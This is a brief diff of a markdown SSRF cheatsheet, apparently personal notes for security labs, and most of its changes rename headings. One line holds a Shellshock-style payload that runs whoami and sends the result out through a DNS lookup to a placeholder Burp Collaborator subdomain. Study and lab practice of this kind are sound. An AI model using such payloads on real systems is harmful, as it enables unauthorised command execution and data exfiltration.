@@ -1,4 +1,4 @@
-# SSRF - CHEATSHEET + IMPORTANT LABS
+# SSRF - CHEATSHEET + LABS
 
 ## Key terms
 
@@ -6,7 +6,7 @@
 loopback network interface
 ```
 
-## Most important labs
+## Walkthrough - Most Important Labs
 
 - [SSRF via arbitraty host + EXTRA lab: absolute path](../Host-Header-Injection/SSRF-via-arbitraryhost-and-absolute-path.md)
 
@@ -35,7 +35,7 @@ loopback network interface
 
 ```
 
-#### Cheat Sheet
+## Cheat Sheet
 
 ```
 () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN```
